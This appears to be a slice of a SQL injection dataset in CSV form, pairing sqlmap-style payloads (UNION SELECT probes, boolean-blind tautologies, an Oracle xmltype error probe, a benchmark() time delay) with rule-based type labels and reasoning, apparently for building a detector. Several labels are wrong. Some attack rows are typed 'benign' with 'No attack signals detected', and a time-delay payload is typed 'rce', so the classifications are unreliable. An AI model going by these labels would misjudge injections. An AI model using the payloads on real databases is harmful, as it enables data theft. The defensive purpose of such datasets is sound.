row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7740,"1"" ) union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7741,1 ) ) as zykv where 2158 = 2158,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7742,"-2006' ) ) union all select 7852,7852,7852,7852,7852--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7743,"-2948' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'ivwt' = 'ivwt",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
7744,"1 ) as zelk where 1944 = 1944 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,1944 = 1944 or detected — boolean_blind injection (priority 8) on generic,rule-based
7745,"1%"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""%"" = """,1,,boolean_blind,firebird,0.95,) and ( detected — boolean_blind injection (priority 8) on firebird,rule-based
7746,1 ) ) as fqee where 3286 = 3286,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7747,"1"" ) where 7452 = 7452",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7748,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7749,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ltym' = 'ltym",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
7750,"1' ) ) union all select null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7751,"1"" ) as ffon where 2738 = 2738 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
7752,"select * from generate_series ( 9058,9058,case when ( 9058 = 1183 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
7753,"1' ) as yjdg where 5262 = 5262 union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7754,"-2860"" ) ) order by 1#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7755,"elt ( 2427 = 2427,5518 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
